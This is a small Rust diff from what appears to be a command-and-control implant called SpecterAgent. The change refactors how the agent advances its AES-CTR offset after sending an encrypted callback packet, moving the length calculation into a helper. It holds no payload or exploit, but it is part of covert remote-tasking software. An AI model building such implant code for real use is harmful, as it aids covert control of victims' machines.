@@ -12,7 +12,7 @@ use crate::dispatch::{self, DispatchResult, Response};
 use crate::error::SpecterError;
 use crate::metadata::current_unix_secs;
 use crate::pivot::PivotState;
-use crate::protocol::{build_callback_packet, parse_tasking_response};
+use crate::protocol::{build_callback_packet, callback_ctr_blocks, parse_tasking_response};
 
 use super::SpecterAgent;
 
@@ -524,9 +524,8 @@ impl SpecterAgent {
         let response = self.transport.send(&packet).await?;
 
         // Monotonic CTR: advance the shared offset by the blocks consumed by the
-        // encrypted portion: seq_num(8 LE) + payload_len(4) + payload_bytes.
-        let encrypted_len = 8 + 4 + payload.len();
-        self.ctr_offset += ctr_blocks_for_len(encrypted_len);
+        // seq-protected encrypted inner body (see `build_callback_packet`).
+        self.ctr_offset += callback_ctr_blocks(command_id, payload.len());
         self.callback_seq += 1;
 
         Ok(response)
